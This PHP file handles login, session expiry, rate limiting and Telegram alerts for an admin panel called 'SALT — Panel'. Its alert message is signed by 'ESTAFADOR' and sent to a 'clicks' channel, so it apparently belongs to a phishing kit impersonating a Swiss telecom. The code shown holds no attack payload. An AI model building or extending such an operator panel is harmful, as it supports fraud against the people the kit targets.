<?php

declare(strict_types=1);

const PANEL_SESSION_TTL = 3600;

function panel_session_start(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        $secure = !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off';
        session_set_cookie_params([
            'lifetime' => 0,
            'path' => '/',
            'httponly' => true,
            'samesite' => 'Strict',
            'secure' => $secure,
        ]);
        session_start();
    }
}

function panel_password_configured(): bool
{
    $config = telegram_config();
    if ($config === null) {
        return false;
    }

    return trim((string) ($config['panel_password'] ?? '')) !== '';
}

function panel_password_valid(string $password): bool
{
    $config = telegram_config();
    if ($config === null) {
        return false;
    }

    $expected = (string) ($config['panel_password'] ?? '');
    if ($expected === '') {
        return false;
    }

    return hash_equals($expected, $password);
}

function panel_is_authenticated(): bool
{
    panel_session_start();

    if (empty($_SESSION['salt_panel_auth'])) {
        return false;
    }

    $authAt = (int) ($_SESSION['salt_panel_auth_at'] ?? 0);
    if ($authAt <= 0 || (time() - $authAt) >= PANEL_SESSION_TTL) {
        panel_clear_authenticated();

        return false;
    }

    return true;
}

function panel_session_expires_at(): ?int
{
    panel_session_start();

    if (empty($_SESSION['salt_panel_auth'])) {
        return null;
    }

    $authAt = (int) ($_SESSION['salt_panel_auth_at'] ?? 0);
    if ($authAt <= 0) {
        return null;
    }

    return $authAt + PANEL_SESSION_TTL;
}

function panel_set_authenticated(): void
{
    panel_session_start();
    session_regenerate_id(true);
    $_SESSION['salt_panel_auth'] = true;
    $_SESSION['salt_panel_auth_at'] = time();
}

function panel_clear_authenticated(): void
{
    panel_session_start();
    unset($_SESSION['salt_panel_auth'], $_SESSION['salt_panel_auth_at']);
}

function panel_require_auth(): void
{
    if (!panel_is_authenticated()) {
        http_response_code(401);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['ok' => false, 'error' => 'unauthorized']);
        exit;
    }
}

function panel_require_page_auth(): void
{
    if (!panel_is_authenticated()) {
        header('Location: index.php', true, 302);
        exit;
    }
}

function panel_redirect_if_authenticated(): void
{
    if (panel_is_authenticated()) {
        header('Location: dashboard.php', true, 302);
        exit;
    }
}

function panel_login_alert_rate_limited(): bool
{
    if (!function_exists('client_ip')) {
        require_once __DIR__ . '/telegram.php';
    }

    $ip = client_ip();
    $dir = dirname(__DIR__, 2) . '/data/ratelimit';
    $file = $dir . '/panel-login-' . md5($ip) . '.txt';
    $now = time();
    if (is_file($file) && ($now - (int) file_get_contents($file)) < 60) {
        return true;
    }
    file_put_contents($file, (string) $now);

    return false;
}

function notify_panel_login_failed(): bool
{
    if (!function_exists('client_ip')) {
        require_once __DIR__ . '/telegram.php';
    }

    $ip = client_ip();
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);
    $datetime = $now->format('Y-m-d H:i:s');
    $interfaceDate = $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');

    $text = implode("\n", [
        '[🔐] TENTATIVE CONNEXION PANEL [🔐]',
        '',
        '🕐 ' . $datetime,
        '',
        'ℹ️ INFORMATIONS',
        '⤷ IP : ' . $ip,
        '⤷ Statut : mot de passe incorrect',
        '',
        '━━━━━━━━━━━━━━━━━━━',
        '📱Interface : SALT — Panel',
        '[' . $interfaceDate . ']',
        '',
        '➢ Developed By ESTAFADOR - @iblisV2',
        '━━━━━━━━━━━━━━━━━━━━',
    ]);

    return send_telegram_message($text, 'clicks');
}
